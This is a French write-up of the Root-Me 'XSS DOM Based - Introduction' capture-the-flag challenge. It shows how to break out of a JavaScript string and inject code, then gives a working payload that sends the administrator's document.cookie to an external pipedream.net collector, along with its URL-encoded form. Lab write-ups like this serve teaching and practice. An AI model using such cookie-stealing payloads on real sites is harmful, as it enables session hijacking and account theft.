## Challenges

### Web Client

### Challenge: XSS DOM Based - Introduction

#### Problème

Ce défi consiste à comprendre et à exploiter une faille XSS basée sur le DOM.

#### Approche Initiale :

En arrivant sur la page, deux sujets sont présentés (Main et Contact). Analysons l'application Web liée au sujet "main".

````javascript

var random = Math.random() * (99);
var number = '';
if(random == number) {
    document.getElementById('state').style.color = 'green';
    document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
}
else{
    document.getElementById('state').style.color = 'red';
    document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
}

````
Le script JavaScript compare les valeurs de "random" et "number" (où "number" est notre entrée). Si leurs valeurs sont égales, un message est renvoyé :   `You won this game but you don\'t have the flag ;)'`

Sinon:
`Sorry, wrong answer ! The right answer was ' + random;`

Nous pouvons essayer d'entrer une valeur simple afin de voir ce qu'il se passe dans le DOM, par exemple en entrant "Hello world".

`var number = 'Hello world';` 

Nous pouvons constater que notre valeur est bien représentée dans le DOM.

#### Injection Tentative :

**Analyse :**


```javascript 
var number = 'input';
```
Notre entrée utilisateur est reflétée en tant que chaîne de caractères. En manipulant notre entrée, nous pourrions potentiellement injecter notre charge utile en tant que deuxième paramètre dans notre variable. Imaginons envoyer la charge utile suivante :

```javascript 
'; Hola

```
Nous remarquons que notre entrée est reflétée dans le DOM en tant que deuxième paramètre :

```javascript 
var number = ''; Hola';

```
Pour éviter les erreurs de syntaxe, nous terminons notre entrée avec un ";" et déclarons une variable vide :

```javascript 
’ ; chayma ; var chama= ’

```
Résultant en notre entrée étant isolée :

```javascript 
var number = ’ ; chayma; var chama= ’;

```
**Injection:**

Maintenant que nous avons isolé notre entrée, tentons d'injecter du code JavaScript :

```javascript
'; alert('xss basé sur le DOM'); var chama= '; 
```
Le résultat est réussi ! Nous avons réussi à injecter du code JavaScrip.

#### Exploitation : Récupération du Cookie de l'Administrateur

Pour cela, nous redirigeons vers un serveur séparé et ouvrons le document.cookie contenant les informations du cookie. Nous utiliserons RequestBin pour collecter les requêtes HTTP.
    
 ```javascript
    '; document.location.href = 'https://xxxxxxxxxxx.m.pipedream.net/' .concat(document.cookie); var cat=';

```

La redirection est réussie. Maintenant, sur la page de contact, nous encodons notre charge utile et envoyons l'URL à l'administrateur pour récupérer le flag.

URL de la charge utile encodée :

```perl
http://challenge01.root-me.org/web-client/ch32/index.php?number=%27%3B+document.location.replace%28%27https%3A%2F%2Fenqy3luifrlfrhu.m.pipedream.net%2F%27+.concat%28document.cookie%29%29%3B+var+cat%3D%27%3B

```
#### Solution

Format du Flag :

```bash
/flag=rootme{XSSxxxInTr0}
```
Cette approche démontre avec succès l'exploitation de la faille XSS basée sur le DOM pour récupérer le flag.

**NB :**
 
La logique de la résolution de ce challenge est similaire à celle de `XSS - Stockée 1`, vous pouvez vous y référer pour plus de détails. (Dans les deux cas,on a utilisé une injection de code JavaScript via un formulaire de contact pour exfiltrer le cookie de session de l'administrateur vers un serveur externe. Dans la première résolution, on a utilisé une balise `<img>` pour cacher le payload, tandis que dans la seconde, on a utilisé une redirection avec document.location.href)
